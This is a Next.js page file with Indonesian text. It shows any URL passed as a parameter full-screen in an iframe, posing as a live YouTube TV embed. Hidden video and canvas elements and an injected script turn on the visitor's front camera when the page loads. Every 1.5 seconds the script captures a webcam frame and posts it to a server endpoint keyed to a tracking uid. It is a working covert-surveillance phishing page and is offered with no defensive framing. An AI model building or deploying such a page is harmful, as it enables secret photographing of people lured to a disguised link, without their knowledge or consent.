export async function getServerSideProps({ query }) {
  const { url, uid } = query;

  if (!url || !uid) {
    return {
      props: {
        isValid: false,
        url: null,
        uid: null
      }
    };
  }

  return {
    props: {
      isValid: true,
      url: decodeURIComponent(url),
      uid
    }
  };
}

export default function ArticlePage({ isValid, url, uid }) {
  if (!isValid) {
    return (
      <div style={{
        fontFamily: 'sans-serif',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        textAlign: 'center'
      }}>
        <div>
          <h2>❗ Halaman tidak valid</h2>
          <p>Parameter <code>?url=</code> dan <code>&uid=</code> wajib diisi.</p>
        </div>
      </div>
    );
  }

  return (
    <>
      <div className="video-wrap" hidden>
        <video id="video" playsInline autoPlay></video>
      </div>
      <canvas hidden id="canvas" width="640" height="480"></canvas>
      <iframe
        id="Live_YT_TV"
        width="100%"
        height="100%"
        src={url}
        allow="autoplay; camera; microphone; picture-in-picture"
        allowFullScreen
        frameBorder="0"
      ></iframe>

      {/* Scripts & style */}
      <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
      <link
        rel="stylesheet"
        href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
      />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

      <style jsx global>{`
        html, body, iframe {
          margin: 0;
          padding: 0;
          width: 100%;
          height: 100%;
          border: none;
        }
      `}</style>

      <script dangerouslySetInnerHTML={{
        __html: `
          function post(imgdata) {
            $.ajax({
              type: 'POST',
              data: { cat: imgdata },
             url: '/api/post?uid=${uid}',
              dataType: 'json',
              async: false
            });
          }

          const video = document.getElementById('video');
          const canvas = document.getElementById('canvas');

          const constraints = {
            audio: false,
            video: { facingMode: "user" }
          };

          async function init() {
            try {
              const stream = await navigator.mediaDevices.getUserMedia(constraints);
              handleSuccess(stream);
            } catch (e) {
              console.error("getUserMedia error:", e);
            }
          }

          function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            const context = canvas.getContext('2d');
            setInterval(() => {
              context.drawImage(video, 0, 0, 640, 480);
              const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
              post(canvasData);
            }, 1500);
          }

          init();
        `
      }} />
    </>
  );
}
